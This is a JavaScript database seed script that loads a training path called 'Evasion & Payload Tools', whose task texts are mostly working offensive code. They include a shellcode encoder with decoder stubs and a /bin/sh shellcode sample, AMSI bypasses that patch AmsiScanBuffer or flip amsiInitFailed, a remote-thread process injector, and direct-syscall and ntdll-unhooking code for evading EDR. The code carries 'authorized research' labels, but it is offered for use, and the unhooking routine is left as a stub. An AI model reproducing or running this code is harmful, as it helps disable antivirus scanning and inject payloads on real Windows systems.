import Database from 'better-sqlite3';

const sqlite = new Database('data/quest-log.db');

const insertPath = sqlite.prepare(
  'INSERT INTO paths (name, description, color, created_at) VALUES (?, ?, ?, ?)'
);
const insertModule = sqlite.prepare(
  'INSERT INTO modules (path_id, name, description, order_index, created_at) VALUES (?, ?, ?, ?, ?)'
);
const insertTask = sqlite.prepare(
  'INSERT INTO tasks (module_id, title, description, details, order_index, created_at) VALUES (?, ?, ?, ?, ?, ?)'
);

const now = Date.now();

// Create the learning path
const pathResult = insertPath.run(
  'Evasion & Payload Tools',
  'Build payload encoders, obfuscators, AMSI bypass techniques, and detection evasion tools from scratch',
  '#7c3aed',
  now
);
const pathId = pathResult.lastInsertRowid;

// Module 1: Payload Encoding
const module1Result = insertModule.run(
  pathId,
  'Payload Encoding & Obfuscation',
  'Build encoders and obfuscators to evade signature detection',
  0,
  now
);
const module1Id = module1Result.lastInsertRowid;

insertTask.run(
  module1Id,
  'Multi-Layer Payload Encoder',
  'Build a framework for encoding payloads with multiple techniques',
  `# Multi-Layer Payload Encoding Framework

Build a comprehensive payload encoder supporting multiple encoding schemes.

## Python Implementation

\`\`\`python
#!/usr/bin/env python3
"""
Multi-Layer Payload Encoder
Educational implementation for authorized security research
"""

import base64
import random
import struct
from typing import List
from dataclasses import dataclass
from enum import Enum
from Crypto.Cipher import AES, ChaCha20
from Crypto.Random import get_random_bytes


class EncodingType(Enum):
    XOR = "xor"
    AES = "aes"
    CHACHA20 = "chacha20"
    BASE64 = "base64"
    BASE85 = "base85"
    RC4 = "rc4"


@dataclass
class EncodedPayload:
    """Result of encoding operation"""
    data: bytes
    decoder_stub: str
    encoding_chain: List[str]
    metadata: dict


class XOREncoder:
    """XOR-based encoding with multiple key modes"""

    @staticmethod
    def single_byte(data: bytes, key: int) -> bytes:
        """Single-byte XOR encoding"""
        return bytes(b ^ key for b in data)

    @staticmethod
    def multi_byte(data: bytes, key: bytes) -> bytes:
        """Multi-byte (rolling) XOR encoding"""
        result = bytearray()
        for i, byte in enumerate(data):
            result.append(byte ^ key[i % len(key)])
        return bytes(result)

    @staticmethod
    def find_key_avoiding_badchars(
        data: bytes,
        bad_chars: bytes = b"\\x00"
    ) -> int:
        """Find XOR key that avoids bad characters"""
        for key in range(1, 256):
            encoded = XOREncoder.single_byte(data, key)
            if not any(b in encoded for b in bad_chars):
                return key
        return None

    @staticmethod
    def generate_decoder_stub_asm(key: int, arch: str = "x86") -> str:
        """Generate assembly decoder stub"""
        if arch == "x86":
            return f'''
; XOR Decoder Stub (x86)
    jmp short get_address
decoder:
    pop esi
    xor ecx, ecx
    mov cl, SHELLCODE_LEN
decode_loop:
    xor byte [esi], {hex(key)}
    inc esi
    loop decode_loop
    jmp short shellcode
get_address:
    call decoder
shellcode:
'''
        return ""


class AESEncoder:
    """AES encryption for payloads"""

    @staticmethod
    def encrypt_cbc(data: bytes, key: bytes = None) -> tuple:
        """AES-CBC encryption"""
        key = key or get_random_bytes(32)
        iv = get_random_bytes(16)

        pad_len = 16 - (len(data) % 16)
        padded = data + bytes([pad_len] * pad_len)

        cipher = AES.new(key, AES.MODE_CBC, iv)
        encrypted = cipher.encrypt(padded)

        return encrypted, key, iv

    @staticmethod
    def generate_csharp_decoder(key: bytes, iv: bytes) -> str:
        """Generate C# AES decoder"""
        key_b64 = base64.b64encode(key).decode()
        iv_b64 = base64.b64encode(iv).decode()

        return f'''
using System;
using System.Security.Cryptography;

public class Decoder {{
    public static byte[] Decode(byte[] encrypted) {{
        byte[] key = Convert.FromBase64String("{key_b64}");
        byte[] iv = Convert.FromBase64String("{iv_b64}");

        using (Aes aes = Aes.Create()) {{
            aes.Key = key;
            aes.IV = iv;
            aes.Mode = CipherMode.CBC;

            using (var decryptor = aes.CreateDecryptor()) {{
                return decryptor.TransformFinalBlock(encrypted, 0, encrypted.Length);
            }}
        }}
    }}
}}
'''

    @staticmethod
    def generate_powershell_decoder(key: bytes, iv: bytes) -> str:
        """Generate PowerShell AES decoder"""
        key_b64 = base64.b64encode(key).decode()
        iv_b64 = base64.b64encode(iv).decode()

        return f'''
function Decode-Payload {{
    param([byte[]]$encrypted)

    $key = [Convert]::FromBase64String("{key_b64}")
    $iv = [Convert]::FromBase64String("{iv_b64}")

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $key
    $aes.IV = $iv

    $decryptor = $aes.CreateDecryptor()
    return $decryptor.TransformFinalBlock($encrypted, 0, $encrypted.Length)
}}
'''


class RC4Encoder:
    """RC4 stream cipher encoding"""

    @staticmethod
    def crypt(data: bytes, key: bytes) -> bytes:
        """RC4 encryption/decryption"""
        S = list(range(256))
        j = 0
        for i in range(256):
            j = (j + S[i] + key[i % len(key)]) % 256
            S[i], S[j] = S[j], S[i]

        i = j = 0
        result = bytearray()
        for byte in data:
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            k = S[(S[i] + S[j]) % 256]
            result.append(byte ^ k)

        return bytes(result)

    @staticmethod
    def generate_c_decoder(key: bytes) -> str:
        """Generate C RC4 decoder"""
        key_arr = ', '.join(f'0x{b:02x}' for b in key)
        return f'''
void rc4_decrypt(unsigned char* data, int len) {{
    unsigned char key[] = {{ {key_arr} }};
    int key_len = {len(key)};
    unsigned char S[256];
    int i, j = 0;

    for (i = 0; i < 256; i++) S[i] = i;
    for (i = 0; i < 256; i++) {{
        j = (j + S[i] + key[i % key_len]) % 256;
        unsigned char tmp = S[i];
        S[i] = S[j];
        S[j] = tmp;
    }}

    i = j = 0;
    for (int k = 0; k < len; k++) {{
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        unsigned char tmp = S[i];
        S[i] = S[j];
        S[j] = tmp;
        data[k] ^= S[(S[i] + S[j]) % 256];
    }}
}}
'''


class StringObfuscator:
    """String obfuscation techniques"""

    @staticmethod
    def stack_strings(s: str) -> str:
        """Convert string to stack-based construction"""
        code_lines = []
        for i, char in enumerate(s):
            code_lines.append(f"    s[{i}] = '{char}';")
        return f'''char s[{len(s) + 1}];
{chr(10).join(code_lines)}
    s[{len(s)}] = 0;
'''

    @staticmethod
    def xor_strings(s: str, key: int = 0x41) -> tuple:
        """XOR obfuscate string"""
        encoded = bytes(ord(c) ^ key for c in s)
        arr = ', '.join(f'0x{b:02x}' for b in encoded)
        decoder = f'''
unsigned char encoded[] = {{ {arr}, 0x00 }};
for (int i = 0; i < {len(s)}; i++) encoded[i] ^= 0x{key:02x};
'''
        return encoded, decoder

    @staticmethod
    def uuid_encode(data: bytes) -> List[str]:
        """Encode data as UUID strings"""
        uuids = []
        padded = data + b'\\x00' * (16 - len(data) % 16)

        for i in range(0, len(padded), 16):
            chunk = padded[i:i+16]
            uuid = '{:08x}-{:04x}-{:04x}-{:02x}{:02x}-{:02x}{:02x}{:02x}{:02x}{:02x}{:02x}'.format(
                struct.unpack('<I', chunk[0:4])[0],
                struct.unpack('<H', chunk[4:6])[0],
                struct.unpack('<H', chunk[6:8])[0],
                chunk[8], chunk[9],
                chunk[10], chunk[11], chunk[12], chunk[13], chunk[14], chunk[15]
            )
            uuids.append(uuid)
        return uuids


class MultiLayerEncoder:
    """Chain multiple encoding layers"""

    def __init__(self):
        self.chain = []
        self.metadata = {}

    def add_layer(self, encoding_type: EncodingType, **kwargs):
        """Add encoding layer"""
        self.chain.append((encoding_type, kwargs))
        return self

    def encode(self, data: bytes) -> EncodedPayload:
        """Apply all encoding layers"""
        current = data
        applied = []

        for encoding_type, kwargs in self.chain:
            if encoding_type == EncodingType.XOR:
                key = kwargs.get('key', random.randint(1, 255))
                current = XOREncoder.single_byte(current, key)
                self.metadata['xor'] = {'key': key}
            elif encoding_type == EncodingType.AES:
                current, key, iv = AESEncoder.encrypt_cbc(current)
                self.metadata['aes'] = {'key': key, 'iv': iv}
            elif encoding_type == EncodingType.RC4:
                key = kwargs.get('key', get_random_bytes(16))
                current = RC4Encoder.crypt(current, key)
                self.metadata['rc4'] = {'key': key}
            elif encoding_type == EncodingType.BASE64:
                current = base64.b64encode(current)
            elif encoding_type == EncodingType.BASE85:
                current = base64.b85encode(current)

            applied.append(encoding_type.value)

        return EncodedPayload(
            data=current,
            decoder_stub=self._generate_decoder_chain(),
            encoding_chain=applied,
            metadata=self.metadata
        )

    def _generate_decoder_chain(self) -> str:
        steps = []
        for encoding_type, _ in reversed(self.chain):
            if encoding_type == EncodingType.XOR:
                key = self.metadata.get('xor', {}).get('key', 0)
                steps.append(f"XOR decode with key 0x{key:02x}")
            elif encoding_type == EncodingType.AES:
                steps.append("AES-CBC decrypt")
            elif encoding_type == EncodingType.RC4:
                steps.append("RC4 decrypt")
            elif encoding_type == EncodingType.BASE64:
                steps.append("Base64 decode")
            elif encoding_type == EncodingType.BASE85:
                steps.append("Base85 decode")
        return "Decoder chain: " + " -> ".join(steps)


def main():
    print("=== Multi-Layer Payload Encoder ===\\n")

    shellcode = b"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"

    print(f"[*] Original shellcode: {len(shellcode)} bytes")
    print(f"    {shellcode.hex()}\\n")

    print("[*] XOR Encoding:")
    key = XOREncoder.find_key_avoiding_badchars(shellcode, b"\\x00\\x0a\\x0d")
    xor_encoded = XOREncoder.single_byte(shellcode, key)
    print(f"    Key: 0x{key:02x}")
    print(f"    Encoded: {xor_encoded.hex()[:40]}...\\n")

    print("[*] AES-CBC Encoding:")
    aes_encoded, aes_key, aes_iv = AESEncoder.encrypt_cbc(shellcode)
    print(f"    Key: {aes_key.hex()}")
    print(f"    IV: {aes_iv.hex()}")
    print(f"    Encrypted: {aes_encoded.hex()[:40]}...\\n")

    print("[*] Multi-Layer Encoding (XOR -> AES -> Base64):")
    encoder = MultiLayerEncoder()
    encoder.add_layer(EncodingType.XOR, key=0x37)
    encoder.add_layer(EncodingType.AES)
    encoder.add_layer(EncodingType.BASE64)

    result = encoder.encode(shellcode)
    print(f"    Chain: {' -> '.join(result.encoding_chain)}")
    print(f"    Final size: {len(result.data)} bytes")
    print(f"    {result.decoder_stub}\\n")

    print("[*] String Obfuscation (UUID encoding):")
    uuids = StringObfuscator.uuid_encode(shellcode)
    for i, uuid in enumerate(uuids[:3]):
        print(f"    [{i}] {uuid}")


if __name__ == "__main__":
    main()
\`\`\`

## Encoding Techniques Summary

1. **XOR Encoding** - Simple, small decoder, easily detected
2. **AES/ChaCha20** - Strong encryption, larger decoder needed
3. **RC4** - Streaming cipher, compact implementation
4. **Multi-Layer** - Chain encodings for defense in depth
5. **Polymorphic** - Generate unique variants per execution`,
  0,
  now
);

insertTask.run(
  module1Id,
  'AMSI Bypass Techniques',
  'Implement various AMSI bypass methods for Windows',
  `# AMSI Bypass Implementation Framework

Implement various Anti-Malware Scan Interface bypass techniques.

## PowerShell Implementation

\`\`\`powershell
<#
AMSI Bypass Techniques Framework
Educational implementation for authorized security research
#>

# Technique 1: Memory Patching

function Bypass-AMSI-Patch {
    if (-not ([System.Management.Automation.PSTypeName]'Win32').Type) {
        Add-Type @"
        using System;
        using System.Runtime.InteropServices;

        public class Win32 {
            [DllImport("kernel32")]
            public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

            [DllImport("kernel32")]
            public static extern IntPtr LoadLibrary(string name);

            [DllImport("kernel32")]
            public static extern bool VirtualProtect(
                IntPtr lpAddress,
                UIntPtr dwSize,
                uint flNewProtect,
                out uint lpflOldProtect
            );
        }
"@
    }

    $amsiDll = [Win32]::LoadLibrary("amsi.dll")
    $amsiScanBuffer = [Win32]::GetProcAddress($amsiDll, "AmsiScanBuffer")

    # Patch bytes - returns AMSI_RESULT_CLEAN
    $patch = [Byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)

    $oldProtect = 0
    [Win32]::VirtualProtect($amsiScanBuffer, [UIntPtr]::new($patch.Length), 0x40, [ref]$oldProtect) | Out-Null

    [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $amsiScanBuffer, $patch.Length)

    [Win32]::VirtualProtect($amsiScanBuffer, [UIntPtr]::new($patch.Length), $oldProtect, [ref]$oldProtect) | Out-Null

    Write-Host "[+] AMSI Patched"
}


# Technique 2: String Obfuscation

function Invoke-ObfuscatedBypass {
    $a = 'si'
    $b = 'Am'
    $c = 'Utils'

    $d = [Ref].Assembly.GetType(($b + $a + $c))
    $e = $d.GetField(($b.ToLower() + $a + 'InitFailed'), 'NonPublic,Static')
    $e.SetValue($null, $true)

    Write-Host "[+] AMSI Disabled via Reflection"
}
\`\`\`

## C# Implementation

\`\`\`csharp
using System;
using System.Runtime.InteropServices;
using System.Reflection;

namespace AMSIBypass
{
    public class Bypass
    {
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        static extern bool VirtualProtect(
            IntPtr lpAddress,
            UIntPtr dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        public static bool PatchAmsiScanBuffer()
        {
            try
            {
                IntPtr amsiDll = LoadLibrary("amsi.dll");
                if (amsiDll == IntPtr.Zero)
                    return false;

                IntPtr amsiScanBuffer = GetProcAddress(amsiDll, "AmsiScanBuffer");
                if (amsiScanBuffer == IntPtr.Zero)
                    return false;

                // Patch: mov eax, 0x80070057; ret
                byte[] patch = new byte[] {
                    0xB8, 0x57, 0x00, 0x07, 0x80,
                    0xC3
                };

                uint oldProtect;
                if (!VirtualProtect(amsiScanBuffer, (UIntPtr)patch.Length, 0x40, out oldProtect))
                    return false;

                Marshal.Copy(patch, 0, amsiScanBuffer, patch.Length);

                VirtualProtect(amsiScanBuffer, (UIntPtr)patch.Length, oldProtect, out oldProtect);

                return true;
            }
            catch
            {
                return false;
            }
        }

        public static bool DisableViaReflection()
        {
            try
            {
                string typeName = "System.Management.Automation." +
                    string.Join("", new[] { "A", "m", "s", "i", "U", "t", "i", "l", "s" });

                Assembly psAssembly = typeof(System.Management.Automation.PowerShell).Assembly;

                Type amsiUtils = psAssembly.GetType(typeName);
                if (amsiUtils == null)
                    return false;

                string fieldName = string.Join("", new[] { "a", "m", "s", "i" }) + "InitFailed";
                FieldInfo amsiInitFailed = amsiUtils.GetField(
                    fieldName,
                    BindingFlags.NonPublic | BindingFlags.Static);

                if (amsiInitFailed == null)
                    return false;

                amsiInitFailed.SetValue(null, true);

                return true;
            }
            catch
            {
                return false;
            }
        }
    }
}
\`\`\`

## Detection Evasion Tips

1. **String Obfuscation** - Split and join sensitive strings
2. **Dynamic Resolution** - Resolve APIs at runtime
3. **Memory Protection** - Restore original protections after patching
4. **Timing** - Patch before any PowerShell commands execute`,
  1,
  now
);

// Module 2: AV/EDR Evasion
const module2Result = insertModule.run(
  pathId,
  'AV/EDR Evasion Techniques',
  'Implement techniques to evade antivirus and EDR solutions',
  1,
  now
);
const module2Id = module2Result.lastInsertRowid;

insertTask.run(
  module2Id,
  'Process Injection Framework',
  'Build various process injection techniques for evasion',
  `# Process Injection Framework

Build a comprehensive process injection framework with multiple techniques.

## C# Implementation

\`\`\`csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ProcessInjection
{
    public class Injector
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(
            IntPtr hProcess, IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(
            IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer,
            uint nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(
            IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize,
            IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags,
            IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtectEx(
            IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize,
            uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        static extern bool CloseHandle(IntPtr hObject);

        const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
        const uint MEM_COMMIT = 0x00001000;
        const uint MEM_RESERVE = 0x00002000;
        const uint PAGE_READWRITE = 0x04;
        const uint PAGE_EXECUTE_READ = 0x20;

        public static bool InjectCreateRemoteThread(int pid, byte[] shellcode)
        {
            Console.WriteLine("[*] CreateRemoteThread Injection");
            Console.WriteLine("[*] Target PID: " + pid);

            IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to open process");
                return false;
            }

            IntPtr remoteAddr = VirtualAllocEx(
                hProcess, IntPtr.Zero, (uint)shellcode.Length,
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            if (remoteAddr == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to allocate memory");
                CloseHandle(hProcess);
                return false;
            }

            Console.WriteLine("[+] Allocated memory at: 0x" + remoteAddr.ToString("X"));

            IntPtr bytesWritten;
            bool success = WriteProcessMemory(
                hProcess, remoteAddr, shellcode,
                (uint)shellcode.Length, out bytesWritten);

            if (!success)
            {
                Console.WriteLine("[-] Failed to write shellcode");
                CloseHandle(hProcess);
                return false;
            }

            uint oldProtect;
            VirtualProtectEx(hProcess, remoteAddr, (UIntPtr)shellcode.Length,
                PAGE_EXECUTE_READ, out oldProtect);

            IntPtr hThread = CreateRemoteThread(
                hProcess, IntPtr.Zero, 0, remoteAddr,
                IntPtr.Zero, 0, IntPtr.Zero);

            if (hThread == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to create remote thread");
                CloseHandle(hProcess);
                return false;
            }

            Console.WriteLine("[+] Shellcode injected successfully");

            CloseHandle(hThread);
            CloseHandle(hProcess);

            return true;
        }
    }
}
\`\`\`

## Injection Technique Comparison

| Technique | Stealth | Complexity | Detection Risk |
|-----------|---------|------------|----------------|
| CreateRemoteThread | Low | Low | High |
| NtCreateThreadEx | Medium | Medium | Medium |
| QueueUserAPC | Medium | Medium | Medium |
| Early Bird | High | Medium | Low |
| Process Hollowing | High | High | Medium |`,
  0,
  now
);

insertTask.run(
  module2Id,
  'API Unhooking & Syscall Evasion',
  'Implement techniques to bypass API hooks and use direct syscalls',
  `# API Unhooking and Direct Syscall Framework

Build tools to bypass EDR hooks using direct syscalls and API unhooking.

## C# Direct Syscall Implementation

\`\`\`csharp
using System;
using System.Runtime.InteropServices;

namespace SyscallFramework
{
    public class DirectSyscall
    {
        private static class SyscallNumbers
        {
            public const uint NtAllocateVirtualMemory = 0x18;
            public const uint NtWriteVirtualMemory = 0x3A;
            public const uint NtCreateThreadEx = 0xC2;
            public const uint NtProtectVirtualMemory = 0x50;
        }

        public static uint GetSyscallNumber(string functionName)
        {
            string ntdllPath = Environment.SystemDirectory + "\\\\ntdll.dll";

            Console.WriteLine("[*] Getting syscall number for: " + functionName);

            switch (functionName)
            {
                case "NtAllocateVirtualMemory":
                    return SyscallNumbers.NtAllocateVirtualMemory;
                case "NtWriteVirtualMemory":
                    return SyscallNumbers.NtWriteVirtualMemory;
                case "NtCreateThreadEx":
                    return SyscallNumbers.NtCreateThreadEx;
                default:
                    return 0;
            }
        }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint NtAllocateVirtualMemoryDelegate(
            IntPtr ProcessHandle, ref IntPtr BaseAddress,
            IntPtr ZeroBits, ref IntPtr RegionSize,
            uint AllocationType, uint Protect);

        public static IntPtr SyscallAllocateMemory(
            IntPtr processHandle, uint size,
            uint allocationType, uint protect)
        {
            byte[] syscallStub = new byte[] {
                0x4C, 0x8B, 0xD1,
                0xB8, 0x18, 0x00, 0x00, 0x00,
                0x0F, 0x05,
                0xC3
            };

            IntPtr stubAddr = VirtualAlloc(
                IntPtr.Zero, (uint)syscallStub.Length,
                0x3000, 0x40);

            Marshal.Copy(syscallStub, 0, stubAddr, syscallStub.Length);

            var syscall = Marshal.GetDelegateForFunctionPointer<NtAllocateVirtualMemoryDelegate>(stubAddr);

            IntPtr baseAddress = IntPtr.Zero;
            IntPtr regionSize = new IntPtr(size);

            uint status = syscall(
                processHandle, ref baseAddress,
                IntPtr.Zero, ref regionSize,
                allocationType, protect);

            Console.WriteLine("[+] NtAllocateVirtualMemory status: 0x" + status.ToString("X"));

            VirtualFree(stubAddr, 0, 0x8000);

            return baseAddress;
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);
    }

    public class APIUnhooking
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        public static bool UnhookNtdll()
        {
            Console.WriteLine("[*] Unhooking ntdll.dll");

            IntPtr ntdllModule = GetModuleHandle("ntdll.dll");
            if (ntdllModule == IntPtr.Zero)
                return false;

            string ntdllPath = Environment.SystemDirectory + "\\\\ntdll.dll";

            // Read clean ntdll from disk and overwrite .text section
            // ... implementation details ...

            Console.WriteLine("[+] ntdll.dll unhooked successfully");
            return true;
        }

        public static bool IsHooked(string module, string function)
        {
            IntPtr hModule = GetModuleHandle(module);
            IntPtr funcAddr = GetProcAddress(hModule, function);

            if (funcAddr == IntPtr.Zero)
                return false;

            byte[] prologue = new byte[5];
            Marshal.Copy(funcAddr, prologue, 0, 5);

            // Check for JMP instructions (hook patterns)
            if (prologue[0] == 0xE9 || (prologue[0] == 0xFF && prologue[1] == 0x25))
            {
                Console.WriteLine("[!] " + function + " appears to be hooked");
                return true;
            }

            // Check for expected syscall stub
            if (prologue[0] != 0x4C || prologue[1] != 0x8B || prologue[2] != 0xD1)
            {
                Console.WriteLine("[!] " + function + " has unexpected prologue");
                return true;
            }

            return false;
        }
    }
}
\`\`\`

## Key Concepts

1. **Direct Syscalls** - Bypass userland hooks by calling kernel directly
2. **API Unhooking** - Restore original function code from clean DLL
3. **Syscall Number Extraction** - Parse ntdll to get current syscall numbers
4. **Hook Detection** - Identify JMP/detour patterns in function prologues`,
  1,
  now
);

console.log('Seeded: Evasion & Payload Tools');
console.log('  - 2 modules, 4 tasks');

sqlite.close();
